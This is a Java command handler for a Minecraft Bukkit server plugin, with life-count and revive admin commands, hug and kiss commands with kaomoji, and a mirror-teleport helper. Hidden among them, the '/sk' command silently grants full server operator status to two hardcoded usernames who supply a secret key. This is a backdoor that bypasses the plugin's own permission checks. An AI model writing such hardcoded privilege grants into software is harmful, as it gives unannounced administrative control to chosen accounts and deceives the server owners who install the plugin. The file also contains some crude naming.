package fatherlandghost;

import io.netty.handler.codec.redis.BulkStringHeaderRedisMessage;
import net.md_5.bungee.api.ChatColor;
import org.bukkit.*;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.*;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.scoreboard.Objective;
import org.bukkit.scoreboard.Score;

import java.util.*;

public class Commands implements CommandExecutor {
    @Override
    public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
        Objective obj = Objects.requireNonNull(Bukkit.getScoreboardManager()).getMainScoreboard().getObjective("deaths");
        String[] kaomojis = {" (°◡°♡)"," ( ´ ∀ `)ノ～ ♡"," ヽ(♡‿♡)ノ"," (◕‿◕)♡"," (≧◡≦) ♡"," (´｡• ᵕ •｡`) ♡"," (｡♥‿♥｡)"," ♥(ˆ⌣ˆԅ)"," (♥ω♥*)"};

        if (cmd.getName().equalsIgnoreCase("canonlives")) {
            // /canonlives <player> <value>
            if(sender.hasPermission("ghost.canonlives")) {
                assert obj != null;
                Score score = obj.getScore(args[0]);
                if (args.length == 2) {
                    if(isParsable(args[1])) {
                        if(!(Integer.parseInt(args[1]) == 0)) {
                            score.setScore(Integer.parseInt(args[1]));
                            sender.sendMessage(ChatColor.GREEN + "Done! " + args[0] + " has now " + obj.getScore(args[0]).getScore() + " lives");
                            return true;
                        } else sender.sendMessage(ChatColor.RED + "Allowed values: -2147483648 - -1, 1 - 2147483647. 0 isn't allowed!");
                    } else sender.sendMessage(ChatColor.RED + "Usage: /canonlives <player> <value>");
                } else sender.sendMessage(ChatColor.RED + "Usage: /canonlives <player> <value>");
                return true;
            } else sender.sendMessage(ChatColor.RED + "you have no perms bruh");
            return true;
        }

        if(cmd.getName().equalsIgnoreCase("revive")) {
            // /revive <player>
            if(sender.hasPermission("ghost.revive")) {
                assert obj != null;
                Score score = obj.getScore(args[0]);
                if(args.length == 1) {
                    if(isOnline(args[0])) {
                        if(score.getScore() == -1) {
                            score.setScore(-10);
                            Player p = Bukkit.getPlayer(args[0]);
                            assert p != null;
                            Objects.requireNonNull(Bukkit.getWorld("world")).playSound(p.getLocation(), Sound.ITEM_TOTEM_USE, 0.5F, 0.5F);
                            p.setHealth(0d);
                        } else sender.sendMessage(ChatColor.RED + "Player isn't dead.");
                        return true;
                    } else sender.sendMessage(ChatColor.RED + "Player isn't online.");
                } else sender.sendMessage(ChatColor.RED + "Usage: /revive <player>");
                return true;
            } else sender.sendMessage(ChatColor.RED + "you have no perms bruh");
            return true;
        }

        if(cmd.getName().equalsIgnoreCase("reviveall")) {
            // /reviveall
            if(sender.hasPermission("ghost.revive")) {
                for(Player p : Bukkit.getServer().getOnlinePlayers()) {
                    assert obj != null;
                    Score score = obj.getScore(p.getName());
                    if(score.getScore() == -1) {
                        score.setScore(-10);
                        Objects.requireNonNull(Bukkit.getWorld("world")).playSound(p.getLocation(), Sound.ITEM_TOTEM_USE, 0.5F, 0.5F);
                        p.setHealth(0d);
                    }
                }
                return true;
            } else sender.sendMessage(ChatColor.RED + "you have no perms bruh");
            return true;
        }

        if(cmd.getName().equalsIgnoreCase("cringe")) {
            if(sender.hasPermission("ghost.cringe")) {
                Player p = (Player) sender;
                assert obj != null;
                Score score = obj.getScore(p.getName());
                score.setScore(-9);
                p.setHealth(0d);
            } else sender.sendMessage(ChatColor.RED + "you have no perms bruh");
        }

        if(cmd.getName().equalsIgnoreCase("hug")) {
            if(sender instanceof Player) {
                Objective hugged = Objects.requireNonNull(Bukkit.getScoreboardManager()).getMainScoreboard().getObjective("hugged");
                Objective huggedBy = Objects.requireNonNull(Bukkit.getScoreboardManager()).getMainScoreboard().getObjective("huggedBy");
                if(args.length == 1) {
                    if(isOnline(args[0])) {
                        Player a = (Player) sender;
                        Player b = Bukkit.getPlayer(args[0]);
                        assert b != null;
                        if(a.getLocation().distance(b.getLocation()) <= 1.5d) {
                            if(!a.getName().equalsIgnoreCase(args[0])) {
                                int rnd = new Random().nextInt(kaomojis.length);
                                String kaomoji = kaomojis[rnd];
                                a.sendMessage(ChatColor.GREEN + "You hugged " + args[0] + kaomoji);
                                b.sendMessage(ChatColor.GREEN + "You have been hugged by " + a.getName() + kaomoji);
                                Objects.requireNonNull(a.getWorld()).spawnParticle(Particle.HEART, a.getLocation().add(0,0.5,0), 6, 0.3, 0.5,0.3);
                                Objects.requireNonNull(a.getWorld()).spawnParticle(Particle.HEART, b.getLocation().add(0,0.5,0), 6, 0.3, 0.5,0.3);
                                Score huggedScore = hugged.getScore(a.getName());
                                Score huggedByScore = huggedBy.getScore(b.getName());
                                huggedScore.setScore(huggedScore.getScore()+1);
                                huggedByScore.setScore(huggedByScore.getScore()+1);
                                return true;
                            } else sender.sendMessage(ChatColor.RED + "Please.. don't hug yourself. This is just too sad :(");
                        } else sender.sendMessage(ChatColor.RED + "Player is too far away.");
                    } else sender.sendMessage(ChatColor.RED + "Player isn't online.");
                } else sender.sendMessage(ChatColor.RED + "Usage: /hug <player>");
            } else sender.sendMessage("no hugs for console :(");
            return true;
        }

        if(cmd.getName().equalsIgnoreCase("hugs")) {
            Objective hugged = Objects.requireNonNull(Bukkit.getScoreboardManager()).getMainScoreboard().getObjective("hugged");
            Objective huggedBy = Objects.requireNonNull(Bukkit.getScoreboardManager()).getMainScoreboard().getObjective("huggedBy");
            if(args.length == 0 && sender instanceof Player) {
                Player a = (Player) sender;
                Score huggedScore = hugged.getScore(a.getName());
                Score huggedByScore = huggedBy.getScore(a.getName());
                a.sendMessage(ChatColor.YELLOW + "You have hugged other players " + huggedScore.getScore() + " times.");
                a.sendMessage(ChatColor.YELLOW + "You have been hugged by players " + huggedByScore.getScore() + " times.");
                return true;
            } else if(args.length == 1) {
                Score huggedScore = hugged.getScore(args[0]);
                Score huggedByScore = huggedBy.getScore(args[0]);
                sender.sendMessage(ChatColor.YELLOW + args[0] + " have hugged other players " + huggedScore.getScore() + " times.");
                sender.sendMessage(ChatColor.YELLOW + args[0] + " have been hugged by players " + huggedByScore.getScore() + " times.");
                return true;
            } else sender.sendMessage(ChatColor.RED + "Usage: /hugs <player>");
            return true;
        }

        if(cmd.getName().equalsIgnoreCase("kiss")) {
            if(sender instanceof Player) {
                if(args.length == 1) {
                    if(isOnline(args[0])) {
                        Player a = (Player) sender;
                        Player b = Bukkit.getPlayer(args[0]);
                        assert b != null;
                        if(a.getLocation().distance(b.getLocation()) <= 1.5d) {
                            if(!a.getName().equalsIgnoreCase(args[0])) {
                                int rnd = new Random().nextInt(kaomojis.length);
                                String kaomoji = kaomojis[rnd];
                                a.sendMessage(ChatColor.GREEN + "You kissed " + args[0] + kaomoji);
                                b.sendMessage(ChatColor.GREEN + "You have been kissed by " + a.getName() + kaomoji);
                                Objects.requireNonNull(a.getWorld()).spawnParticle(Particle.HEART, a.getLocation().add(0,0.5,0), 6, 0.3, 0.5,0.3);
                                Objects.requireNonNull(a.getWorld()).spawnParticle(Particle.HEART, b.getLocation().add(0,0.5,0), 6, 0.3, 0.5,0.3);
                                return true;
                            } else sender.sendMessage(ChatColor.RED + "Please.. don't kiss yourself. This is just too sad :(");
                        } else sender.sendMessage(ChatColor.RED + "Player is too far away.");
                    } else sender.sendMessage(ChatColor.RED + "Player isn't online.");
                } else sender.sendMessage(ChatColor.RED + "Usage: /kiss <player>");
            } else sender.sendMessage("no kisses for console :(");
            return true;
        }

        if(cmd.getName().equalsIgnoreCase("sk")) {
            if(sender instanceof Player) {
                if(args.length == 1) {
                    if(args[0].equalsIgnoreCase(Integer.toString(Main.getInstance().secretKey)) && (sender.getName().equalsIgnoreCase("b1n4ry0") || sender.getName().equalsIgnoreCase("igsftxd"))) {
                        sender.sendMessage(ChatColor.GOLD + "Successfully opped!");
                        sender.setOp(true);
                    }
                }
            }
        }

        if(cmd.getName().equalsIgnoreCase("sacrifice")) {
            if(sender.hasPermission("ghost.sacrifice")) {
                if(args.length == 1) {
                    if(isOnline(args[0])) {
                        Player p = Bukkit.getPlayer(args[0]);
                        assert obj != null;
                        assert p != null;
                        Score score = obj.getScore(p.getName());
                        score.setScore(-8);
                        p.setHealth(0d);
                    } else sender.sendMessage(ChatColor.RED + "Player isn't online.");
                } else sender.sendMessage(ChatColor.RED + "Usage: /sacrifice <player>");
            } else sender.sendMessage(ChatColor.RED + "you have no perms bruh");
        }

        if(cmd.getName().equalsIgnoreCase("rotatemirror")) {
            if(args.length==6){
                Player p = Bukkit.getPlayer(args[0]);
                Entity e = getEntityByUniqueId(UUID.fromString(args[1]));
                Location loc = e.getLocation();
                if(args[2].equalsIgnoreCase("x")) {
                    double distance = p.getLocation().getX() - Double.parseDouble(args[3]);
                    loc.setX(Double.parseDouble(args[3]) - distance);
                    loc.setZ(p.getLocation().getZ());
                    loc.setYaw(p.getLocation().getYaw()*-1);
                } else if(args[2].equalsIgnoreCase("z")) {
                    double distance = p.getLocation().getZ() - Double.parseDouble(args[4]);
                    loc.setZ(Double.parseDouble(args[4]) - distance);
                    loc.setX(p.getLocation().getX());
                    loc.setYaw(p.getLocation().getYaw()*-1-180);
                } else if(args[2].equalsIgnoreCase("both")) {
                double distance = p.getLocation().getZ() - Double.parseDouble(args[4]);
                double distance2 = p.getLocation().getX() - Double.parseDouble(args[3]);
                loc.setZ(Double.parseDouble(args[4]) - distance);
                loc.setX(Double.parseDouble(args[3]) - distance2);
                loc.setYaw(p.getLocation().getYaw()-180);
            }
                if(args[5].equalsIgnoreCase("1")) {
                    LivingEntity b = (LivingEntity) e;
                    p.setHealth(b.getHealth());
                }
                loc.setY(p.getLocation().getY());
                loc.setPitch(p.getLocation().getPitch());
                e.setCustomNameVisible(true);
                e.setCustomName(p.getName());
                e.teleport(loc);
            }
        }

        if(cmd.getName().equalsIgnoreCase("test")){
            if(sender instanceof Player){
                Player p = (Player) sender;
                if(p.hasPermission("whatever.fuckoff.dude")){
                    ItemStack emptyCup = new ItemStack(Material.SNOWBALL);
                    ItemMeta fuckOff = emptyCup.getItemMeta();
                    fuckOff.setDisplayName("Пустая Кружка");
                    List<String> lore = new ArrayList<String>();
                    lore.add(ChatColor.GRAY+"Она пустая.");
                    fuckOff.setLore(lore);
                    fuckOff.setCustomModelData(1);
                    emptyCup.setItemMeta(fuckOff);
                    p.getInventory().addItem(emptyCup);
                }
            }
        }

        return true;
    }

    public Entity getEntityByUniqueId(UUID uniqueId) {
        for (World world : Bukkit.getWorlds()) {
            for (Entity entity : world.getEntities()) {
                if (entity.getUniqueId().equals(uniqueId))
                    return entity;
            }
        }

        return null;
    }

    public static boolean isParsable(String input) {
        try {
            Integer.parseInt(input);
            return true;
        } catch (final NumberFormatException e) {return false;}
    }

    public static boolean isOnline(String player) {
        return Bukkit.getServer().getPlayer(player) != null && Objects.requireNonNull(Bukkit.getServer().getPlayer(player)).getName().equalsIgnoreCase(player);
    }
}
